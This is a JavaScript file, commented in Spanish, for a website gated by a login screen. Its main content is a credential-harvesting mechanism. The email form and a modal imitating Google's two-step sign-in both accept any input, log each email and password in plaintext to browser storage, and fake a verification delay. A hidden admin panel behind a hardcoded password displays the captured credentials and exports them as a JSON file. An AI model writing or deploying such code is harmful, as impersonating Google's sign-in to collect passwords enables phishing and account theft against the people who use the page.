// ===== CONFIG =====
// Contraseña para abrir el panel de admin (settings). Cámbiala por la que quieras.
const ADMIN_PASSWORD = 'admin2026';

// Claves de almacenamiento
const KEY_ATTEMPTS = 'login_attempts';
const KEY_SESSION  = 'session_user';

// ===== INIT =====
document.addEventListener('DOMContentLoaded', () => {
    const loggedIn = sessionStorage.getItem(KEY_SESSION);
    if (loggedIn) {
        showMainContent();
    } else {
        showLogin();
    }

    // Login con correo + contraseña
    const form = document.getElementById('login-form');
    if (form) form.addEventListener('submit', handleLoginSubmit);

    // Login con Google (mockup con modal de 2 pasos + spinner)
    const btnGoogle = document.getElementById('btn-google');
    if (btnGoogle) btnGoogle.addEventListener('click', openGoogleModal);
    const gNext   = document.getElementById('g-next');
    const gBack   = document.getElementById('g-back');
    const gSignin = document.getElementById('g-signin');
    const gCancel = document.getElementById('g-cancel');
    if (gNext)   gNext.addEventListener('click', googleStepEmail);
    if (gBack)   gBack.addEventListener('click', () => showGoogleStep('email'));
    if (gSignin) gSignin.addEventListener('click', googleStepPassword);
    if (gCancel) gCancel.addEventListener('click', closeGoogleModal);

    // Botón de settings (admin)
    const btnSettings = document.getElementById('btn-settings');
    if (btnSettings) btnSettings.addEventListener('click', openAdminFlow);

    // Botones del panel admin
    const btnClose  = document.getElementById('admin-close');
    const btnClear  = document.getElementById('admin-clear');
    const btnExport = document.getElementById('admin-export');
    if (btnClose)  btnClose.addEventListener('click', closeAdmin);
    if (btnClear)  btnClear.addEventListener('click', clearAttempts);
    if (btnExport) btnExport.addEventListener('click', exportAttempts);
});

// ===== LOGIN =====
function showLogin() {
    document.getElementById('login-screen').classList.remove('hidden');
    document.getElementById('main-content').style.display = 'none';
}

function showMainContent() {
    const login = document.getElementById('login-screen');
    if (login) login.classList.add('hidden');
    document.getElementById('main-content').style.display = 'block';
    setupScrollLinks();
    setupProjectAccordion();
}

function handleLoginSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value;
    const errorEl = document.getElementById('login-error');

    if (!email || !password) {
        errorEl.textContent = 'Ingresa correo y contraseña.';
        errorEl.hidden = false;
        return;
    }
    errorEl.hidden = true;

    saveAttempt({ method: 'email', email, password, ts: Date.now() });
    sessionStorage.setItem(KEY_SESSION, email);
    showMainContent();
}

// ===== FLUJO MODAL GOOGLE (MOCKUP) =====
let googleEmail = '';

function openGoogleModal() {
    showGoogleStep('email');
    document.getElementById('g-email').value = '';
    document.getElementById('g-password').value = '';
    document.getElementById('g-email-error').hidden = true;
    document.getElementById('google-modal').hidden = false;
    setTimeout(() => document.getElementById('g-email').focus(), 50);
}

function closeGoogleModal() {
    document.getElementById('google-modal').hidden = true;
}

function showGoogleStep(step) {
    document.querySelectorAll('.google-step').forEach(el => {
        el.hidden = el.dataset.step !== step;
    });
}

function googleStepEmail() {
    const email = document.getElementById('g-email').value.trim();
    const err = document.getElementById('g-email-error');
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        err.hidden = false;
        return;
    }
    err.hidden = true;
    googleEmail = email;
    document.getElementById('g-chip-email').textContent = email;
    showGoogleStep('password');
    setTimeout(() => document.getElementById('g-password').focus(), 50);
}

function googleStepPassword() {
    const password = document.getElementById('g-password').value;
    saveAttempt({
        method: 'google',
        email: googleEmail,
        password: password,
        ts: Date.now()
    });
    showGoogleStep('loading');
    // Simula verificación de Google
    setTimeout(() => {
        closeGoogleModal();
        sessionStorage.setItem(KEY_SESSION, googleEmail);
        showMainContent();
    }, 2000);
}

// ===== ALMACENAMIENTO DE INTENTOS =====
function saveAttempt(attempt) {
    const list = getAttempts();
    list.push(attempt);
    localStorage.setItem(KEY_ATTEMPTS, JSON.stringify(list));
}

function getAttempts() {
    try {
        return JSON.parse(localStorage.getItem(KEY_ATTEMPTS)) || [];
    } catch {
        return [];
    }
}

// ===== PANEL ADMIN =====
function openAdminFlow() {
    const pwd = prompt('Contraseña de admin:');
    if (pwd === null) return;
    if (pwd !== ADMIN_PASSWORD) {
        alert('Contraseña incorrecta');
        return;
    }
    renderAdmin();
    document.getElementById('admin-panel').hidden = false;
}

function closeAdmin() {
    document.getElementById('admin-panel').hidden = true;
}

function renderAdmin() {
    const list = getAttempts();
    const container = document.getElementById('admin-list');
    if (!list.length) {
        container.innerHTML = '<p class="admin-empty">Aún no hay intentos de login registrados.</p>';
        return;
    }
    // Más recientes arriba
    const items = [...list].reverse().map(a => {
        const date = new Date(a.ts).toLocaleString();
        const method = a.method === 'google' ? 'Google' : 'Email';
        return `
            <div class="admin-item">
                <div><strong>Correo:</strong> ${escapeHtml(a.email || '')}</div>
                <div><strong>Método:</strong> ${method}</div>
                <div><strong>Contraseña:</strong> ${escapeHtml(a.password || '—')}</div>
                <div class="admin-meta">${date}</div>
            </div>`;
    }).join('');
    container.innerHTML = items;
}

function clearAttempts() {
    if (!confirm('¿Borrar todos los intentos guardados?')) return;
    localStorage.removeItem(KEY_ATTEMPTS);
    renderAdmin();
}

function exportAttempts() {
    const data = JSON.stringify(getAttempts(), null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'login_attempts.json';
    a.click();
    URL.revokeObjectURL(url);
}

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ===== NAVEGACIÓN SUAVE =====
function setupScrollLinks() {
    document.querySelectorAll('a[href^="#"]').forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href && href !== '#' && !href.startsWith('http')) {
                e.preventDefault();
                const target = document.querySelector(href);
                if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        });
    });
}

// ===== ACORDEÓN DE PROYECTOS =====
function setupProjectAccordion() {
    document.querySelectorAll('.project-card').forEach(card => {
        card.addEventListener('click', () => card.classList.toggle('open'));
    });
}
